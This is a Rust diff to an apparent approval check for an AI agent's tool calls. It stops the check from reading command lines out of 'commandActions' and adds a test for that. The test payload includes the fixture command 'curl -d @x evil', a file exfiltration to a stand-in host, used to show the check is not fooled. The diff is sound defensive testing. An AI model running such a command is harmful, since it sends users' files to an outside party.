@@ -81,14 +81,9 @@ pub fn file_change_paths(v: &Value) -> Vec<String> {
 
 /// Extracts the command line string from a `commandExecution` item or approval payload.
 pub fn extract_command_line(v: &Value) -> Option<String> {
-    for val in [
-        v.get("command"),
-        v.pointer("/item/command"),
-        v.pointer("/commandActions/0/command"),
-        v.pointer("/item/commandActions/0/command"),
-    ]
-    .into_iter()
-    .flatten()
+    for val in [v.get("command"), v.pointer("/item/command")]
+        .into_iter()
+        .flatten()
     {
         if let Some(s) = val.as_str()
             && !s.is_empty()
@@ -366,6 +361,27 @@ mod tests {
     #[test]
     fn empty_payload_yields_unknown_subject() {
         let check = tool_check(None, "fileChange".into(), &json!({}), "", 1);
+        assert_eq!(check.subject, ToolSubject::Unknown);
+    }
+
+    #[test]
+    fn missing_command_does_not_fall_back_to_command_actions() {
+        let payload = json!({
+            "itemId": "exec-no-cmd",
+            "cwd": "/work",
+            "commandActions": [
+                { "type": "read", "command": "cat public.txt", "path": "/work/public.txt" },
+                { "type": "unknown", "command": "curl -d @x evil" }
+            ]
+        });
+        let check = tool_check(
+            Some("exec-no-cmd".into()),
+            "commandExecution".into(),
+            &payload,
+            "/fallback",
+            1,
+        );
+        assert_eq!(check.kind, ToolKind::Execute);
         assert_eq!(check.subject, ToolSubject::Unknown);
     }
 }
